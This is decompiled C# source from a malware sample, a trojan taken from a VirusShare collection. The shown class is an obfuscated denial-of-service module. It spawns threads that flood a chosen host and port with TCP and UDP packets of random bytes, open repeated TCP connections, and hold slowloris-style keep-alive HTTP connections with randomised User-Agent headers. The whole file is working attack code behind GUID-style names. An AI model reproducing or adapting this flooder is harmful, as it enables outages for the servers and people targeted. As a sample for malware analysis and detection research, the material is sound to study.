// Decompiled with JetBrains decompiler
// Type: {af31a9f4-c619-4821-90ab-0b7318d44507}.{2952c224-cdcd-4e70-aa8e-eee1926e3b6c}
// Assembly: Built, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5BD05E0A-35FE-496C-B5CD-CE720A39B54F
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.pfl-5d072f5224e528472e5a50d1ebed572aa86c2691d7aedaced148054ce65a49be.exe

using \u007B05f1caea\u002D76e9\u002D4664\u002Daaa3\u002Dc3a65e3228d2\u007D;
using \u007Baf31a9f4\u002Dc619\u002D4821\u002D90ab\u002D0b7318d44507\u007D;
using \u007Be0269030\u002D1920\u002D42bf\u002Dbcc9\u002Dcc40375bc38b\u007D;
using \u007Bf78d88e7\u002D075b\u002D4573\u002D8694\u002D8d9a4066b1ab\u007D;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u007Baf31a9f4\u002Dc619\u002D4821\u002D90ab\u002D0b7318d44507\u007D
{
  internal class \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D
  {
    public static \u007B07149cdb\u002D42e1\u002D44ed\u002D863a\u002Dd6372bce9109\u007D \u007B161aceae\u002Da452\u002D42a0\u002Da345\u002Dc24c99eb1d4c\u007D;
    private static bool \u007Bed8c8e86\u002D8bc8\u002D4604\u002Dae7f\u002D90111c3d62d8\u007D;
    private static \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bdf428604\u002D5c22\u002D47e2\u002D89bb\u002Df3c86a0940d8\u007D \u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D;
    private static string \u007B903223ea\u002Dd84a\u002D4b8a\u002Da8a5\u002D85e43a116725\u007D;
    private static int \u007B945645b5\u002D275f\u002D4fb6\u002D94a3\u002D6f597a583bb1\u007D;
    private static int \u007B25872600\u002D1214\u002D4cb4\u002Dbaa7\u002D741d78d9d8af\u007D;
    private static int \u007Bcf720b8f\u002D1668\u002D4a49\u002D9919\u002De517bdc7de5e\u007D;
    private static Decimal \u007B765055df\u002D9f69\u002D4a45\u002D960c\u002D4c5b9386d322\u007D;
    private static Thread[] \u007B300fba2b\u002D7e0e\u002D42b3\u002D823c\u002D7ce17c2f073a\u007D;

    public static bool \u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D
    {
      get => \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bed8c8e86\u002D8bc8\u002D4604\u002Dae7f\u002D90111c3d62d8\u007D;
      set => \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bed8c8e86\u002D8bc8\u002D4604\u002Dae7f\u002D90111c3d62d8\u007D = value;
    }

    public static void \u007B58e18ce2\u002D6a61\u002D490e\u002D86d0\u002D61181f8b553c\u007D(
      \u007B07149cdb\u002D42e1\u002D44ed\u002D863a\u002Dd6372bce9109\u007D _param0,
      string _param1,
      int _param2,
      int _param3,
      int _param4,
      Decimal _param5)
    {
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B903223ea\u002Dd84a\u002D4b8a\u002Da8a5\u002D85e43a116725\u007D = _param1;
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B945645b5\u002D275f\u002D4fb6\u002D94a3\u002D6f597a583bb1\u007D = _param2;
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B25872600\u002D1214\u002D4cb4\u002Dbaa7\u002D741d78d9d8af\u007D = _param3;
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bcf720b8f\u002D1668\u002D4a49\u002D9919\u002De517bdc7de5e\u007D = _param4;
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B765055df\u002D9f69\u002D4a45\u002D960c\u002D4c5b9386d322\u007D = _param5;
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B161aceae\u002Da452\u002D42a0\u002Da345\u002Dc24c99eb1d4c\u007D = _param0;
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D = new \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bdf428604\u002D5c22\u002D47e2\u002D89bb\u002Df3c86a0940d8\u007D();
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D.sin_family = (short) 2;
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D.sin_port = \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B810fadbf\u002D4854\u002D4369\u002D8074\u002D1f05f91e5745\u007D((ushort) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B945645b5\u002D275f\u002D4fb6\u002D94a3\u002D6f597a583bb1\u007D);
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D.sin_addr.S_addr = (uint) \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bf0e5df07\u002D4428\u002D4310\u002D92fc\u002D609548d5994e\u007D(\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B903223ea\u002Dd84a\u002D4b8a\u002Da8a5\u002D85e43a116725\u007D);
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B300fba2b\u002D7e0e\u002D42b3\u002D823c\u002D7ce17c2f073a\u007D = new Thread[_param3];
    }

    public static void \u007Bb0cf246e\u002D2d30\u002D49fc\u002Dbbcd\u002D8ff78d454bf2\u007D()
    {
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D = true;
      new Thread((ThreadStart) (() =>
      {
        try
        {
          for (int index = 0; index < \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B25872600\u002D1214\u002D4cb4\u002Dbaa7\u002D741d78d9d8af\u007D; ++index)
          {
            Thread thread = (Thread) null;
            switch (\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B161aceae\u002Da452\u002D42a0\u002Da345\u002Dc24c99eb1d4c\u007D)
            {
              case \u007B07149cdb\u002D42e1\u002D44ed\u002D863a\u002Dd6372bce9109\u007D.\u007B58d28c9f\u002D7485\u002D494f\u002Da259\u002D5710bb31d4b2\u007D:
                thread = new Thread(new ThreadStart(\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bc96a8d82\u002D1282\u002D4d19\u002D847f\u002Da938fea6f9e6\u007D));
                break;
              case \u007B07149cdb\u002D42e1\u002D44ed\u002D863a\u002Dd6372bce9109\u007D.\u007B6a5336e7\u002D558e\u002D4972\u002D8302\u002D15d1bba1e4fb\u007D:
                thread = new Thread(new ThreadStart(\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bf63e2b5d\u002Da524\u002D46f4\u002Dbe75\u002D3717dd81bb08\u007D));
                break;
              case \u007B07149cdb\u002D42e1\u002D44ed\u002D863a\u002Dd6372bce9109\u007D.\u007B7a304cb8\u002D1cf4\u002D4362\u002Da5d7\u002D2813b55f7c85\u007D:
                thread = new Thread(new ThreadStart(\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B85b6d9a9\u002Ded30\u002D4bd7\u002Da6a6\u002D687c0b7ec396\u007D));
                break;
              case \u007B07149cdb\u002D42e1\u002D44ed\u002D863a\u002Dd6372bce9109\u007D.\u007B35239f53\u002D5a5f\u002D4575\u002D819a\u002D799d58706210\u007D:
                thread = new Thread(new ThreadStart(\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bbe24ecae\u002D5628\u002D4424\u002D8f38\u002D0e58d2e249aa\u007D));
                break;
            }
            thread.Start();
            \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B300fba2b\u002D7e0e\u002D42b3\u002D823c\u002D7ce17c2f073a\u007D[index] = thread;
          }
        }
        catch
        {
        }
      })).Start();
    }

    public static void \u007B4f3202c4\u002D9a2d\u002D4f61\u002Dbb7b\u002Ddc35c3ffbabb\u007D()
    {
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D = false;
      \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B300fba2b\u002D7e0e\u002D42b3\u002D823c\u002D7ce17c2f073a\u007D = (Thread[]) null;
    }

    private static void \u007Bc96a8d82\u002D1282\u002D4d19\u002D847f\u002Da938fea6f9e6\u007D()
    {
      IntPtr zero1 = IntPtr.Zero;
      while (\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D)
      {
        IntPtr num = \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bcd5238e3\u002Db308\u002D41f7\u002Da0df\u002D49f0e6d3912d\u007D();
        byte[] numArray = \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bb510cd30\u002D1030\u002D4003\u002D8c6e\u002Db13385be8b14\u007D();
        if (\u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B1ae20b88\u002D0244\u002D4807\u002D9dd5\u002Dd798fbff1dac\u007D(num, ref \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D, Marshal.SizeOf((object) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D)) == 0)
        {
          for (int index = 0; index < \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bcf720b8f\u002D1668\u002D4a49\u002D9919\u002De517bdc7de5e\u007D; ++index)
          {
            \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Ba19bc217\u002Df52f\u002D4b83\u002Dacda\u002D3746556078e9\u007D(num, numArray, numArray.Length, 0);
            Thread.Sleep(1);
          }
        }
        \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(num);
        zero1 = IntPtr.Zero;
        if (\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D)
          \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007Bcbeb00d7\u002D1a31\u002D457b\u002Db6de\u002Ddf6d7ee116c1\u007D((int) TimeSpan.FromSeconds((double) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B765055df\u002D9f69\u002D4a45\u002D960c\u002D4c5b9386d322\u007D).TotalMilliseconds);
        else
          break;
      }
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(zero1);
      IntPtr zero2 = IntPtr.Zero;
    }

    private static void \u007Bf63e2b5d\u002Da524\u002D46f4\u002Dbe75\u002D3717dd81bb08\u007D()
    {
      IntPtr zero1 = IntPtr.Zero;
      while (\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D)
      {
        IntPtr num = \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B510e87c7\u002D63e4\u002D4669\u002D8c62\u002D23df6a6fedc7\u007D();
        byte[] numArray = \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B814f7dfb\u002D7ca6\u002D4602\u002D96a7\u002D9a5b334110ad\u007D();
        for (int index = 0; index < \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bcf720b8f\u002D1668\u002D4a49\u002D9919\u002De517bdc7de5e\u007D; ++index)
        {
          \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd7783ed5\u002D5a37\u002D4e9e\u002D9f49\u002De5d87cae1a08\u007D(num, numArray, numArray.Length, 0, \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D, Marshal.SizeOf((object) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D));
          Thread.Sleep(1);
        }
        \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(num);
        zero1 = IntPtr.Zero;
        if (\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D)
          \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007Bcbeb00d7\u002D1a31\u002D457b\u002Db6de\u002Ddf6d7ee116c1\u007D((int) TimeSpan.FromSeconds((double) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B765055df\u002D9f69\u002D4a45\u002D960c\u002D4c5b9386d322\u007D).TotalMilliseconds);
        else
          break;
      }
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(zero1);
      IntPtr zero2 = IntPtr.Zero;
    }

    private static void \u007B85b6d9a9\u002Ded30\u002D4bd7\u002Da6a6\u002D687c0b7ec396\u007D()
    {
      IntPtr zero1 = IntPtr.Zero;
      while (\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D)
      {
        IntPtr num = \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bcd5238e3\u002Db308\u002D41f7\u002Da0df\u002D49f0e6d3912d\u007D();
        \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B1ae20b88\u002D0244\u002D4807\u002D9dd5\u002Dd798fbff1dac\u007D(num, ref \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D, Marshal.SizeOf((object) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D));
        Thread.Sleep(100);
        \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(num);
        zero1 = IntPtr.Zero;
      }
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(zero1);
      IntPtr zero2 = IntPtr.Zero;
    }

    private static void \u007Bbe24ecae\u002D5628\u002D4424\u002D8f38\u002D0e58d2e249aa\u007D()
    {
      IntPtr num = IntPtr.Zero;
      while (\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D)
      {
        num = \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007Bcd5238e3\u002Db308\u002D41f7\u002Da0df\u002D49f0e6d3912d\u007D();
        \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B1ae20b88\u002D0244\u002D4807\u002D9dd5\u002Dd798fbff1dac\u007D(num, ref \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D, Marshal.SizeOf((object) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D));
        while (\u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D)
        {
          byte[] numArray = \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B8709af51\u002D9379\u002D401b\u002D91bf\u002Dbbdddd03a8ad\u007D();
          if (\u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Ba19bc217\u002Df52f\u002D4b83\u002Dacda\u002D3746556078e9\u007D(num, numArray, numArray.Length, 0) != -1 && \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B3f26aaae\u002Dacad\u002D4eea\u002D9cf2\u002Da840b4215ba1\u007D)
            \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007Bcbeb00d7\u002D1a31\u002D457b\u002Db6de\u002Ddf6d7ee116c1\u007D(2000);
          else
            break;
        }
        \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(num);
        \u007B99666baa\u002Dc582\u002D4eef\u002Dafa6\u002D7b3fc86585d2\u007D.\u007Bcbeb00d7\u002D1a31\u002D457b\u002Db6de\u002Ddf6d7ee116c1\u007D((int) TimeSpan.FromSeconds((double) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B765055df\u002D9f69\u002D4a45\u002D960c\u002D4c5b9386d322\u007D).TotalMilliseconds);
      }
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007Bd361ff4c\u002D8a49\u002D43bb\u002D97c1\u002De117af154982\u007D(num);
      IntPtr zero = IntPtr.Zero;
    }

    private static IntPtr \u007Bcd5238e3\u002Db308\u002D41f7\u002Da0df\u002D49f0e6d3912d\u007D()
    {
      IntPtr num1 = \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B9eeca9df\u002D4df9\u002D4b0f\u002D8208\u002Df5386809e89e\u007D((int) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D.sin_family, 1, 6);
      ulong num2 = 1;
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B37ab57f3\u002De16b\u002D476d\u002D983d\u002D5ae46ed2dbd0\u007D(num1, 2147772030L, ref num2);
      return num1;
    }

    private static IntPtr \u007B510e87c7\u002D63e4\u002D4669\u002D8c62\u002D23df6a6fedc7\u007D()
    {
      IntPtr num1 = \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B9eeca9df\u002D4df9\u002D4b0f\u002D8208\u002Df5386809e89e\u007D((int) \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B1e48843c\u002Dc0c1\u002D4bf8\u002D9921\u002Da82282a320b8\u007D.sin_family, 2, 17);
      ulong num2 = 1;
      \u007B84e58574\u002D2f68\u002D4dcf\u002D86d3\u002D0e67ec5a19a9\u007D.\u007B37ab57f3\u002De16b\u002D476d\u002D983d\u002D5ae46ed2dbd0\u007D(num1, 2147772030L, ref num2);
      return num1;
    }

    private static byte[] \u007B814f7dfb\u002D7ca6\u002D4602\u002D96a7\u002D9a5b334110ad\u007D()
    {
      Random random = new Random(DateTime.Now.Millisecond);
      byte[] buffer = new byte[random.Next(1024, 65507)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] \u007Bb510cd30\u002D1030\u002D4003\u002D8c6e\u002Db13385be8b14\u007D()
    {
      Random random = new Random(DateTime.Now.Millisecond);
      byte[] buffer = new byte[random.Next(1024, (int) ushort.MaxValue)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] \u007B8709af51\u002D9379\u002D401b\u002D91bf\u002Dbbdddd03a8ad\u007D()
    {
      Random random = new Random();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append("GET / HTTP/1.1\r\n");
      stringBuilder.Append("Host: " + \u007B2952c224\u002Dcdcd\u002D4e70\u002Daa8e\u002Deee1926e3b6c\u007D.\u007B903223ea\u002Dd84a\u002D4b8a\u002Da8a5\u002D85e43a116725\u007D + "\r\n");
      stringBuilder.Append("User-Agent: " + \u007B82ae5708\u002D4754\u002D4b76\u002Daf22\u002D8a4f62c094a0\u007D.\u007B67fb42c0\u002Ddbf4\u002D48f9\u002D9980\u002De9f9b92dde81\u007D(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B310a0a34\u002Daef5\u002D410d\u002D9df9\u002Dfb25e20cecb3\u007D[random.Next(0, \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B310a0a34\u002Daef5\u002D410d\u002D9df9\u002Dfb25e20cecb3\u007D.Length - 1)], true) + " " + \u007B82ae5708\u002D4754\u002D4b76\u002Daf22\u002D8a4f62c094a0\u007D.\u007B67fb42c0\u002Ddbf4\u002D48f9\u002D9980\u002De9f9b92dde81\u007D(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B08d5b9dd\u002D1552\u002D4a17\u002D941b\u002D921aab2d5579\u007D[random.Next(0, \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B08d5b9dd\u002D1552\u002D4a17\u002D941b\u002D921aab2d5579\u007D.Length - 1)], true) + "\r\n");
      stringBuilder.Append("Content-Length: " + random.Next(1, 1000).ToString() + "\r\n");
      stringBuilder.Append("Connection: keep-alive\r\n");
      stringBuilder.Append("X-a: " + random.Next(1, 10000).ToString() + "\r\n");
      return Encoding.ASCII.GetBytes(stringBuilder.ToString());
    }
  }
}
